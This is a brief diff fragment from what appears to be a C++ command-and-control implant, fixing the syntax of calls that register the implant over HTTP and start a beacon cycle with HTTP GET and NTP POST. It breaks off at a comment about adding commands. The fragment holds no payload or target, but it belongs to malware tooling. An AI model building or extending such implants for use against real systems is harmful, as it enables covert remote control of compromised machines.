@@ -104,10 +104,10 @@ int main() {
     C2Implant implant;
 
     //register implant, choose any protocol that's included...
-    implant::register_implant(InMethod::HTTP);
+    implant.register_implant(InMethod::HTTP);
     //ex, start cycle, with 
     //GET on http, POST on NTP
-    implant::cycle(InMethod::HTTP, OutMethod::NTP);
+    implant.cycle(InMethod::HTTP, OutMethod::NTP);
 
     /*
     Add 2 commands.
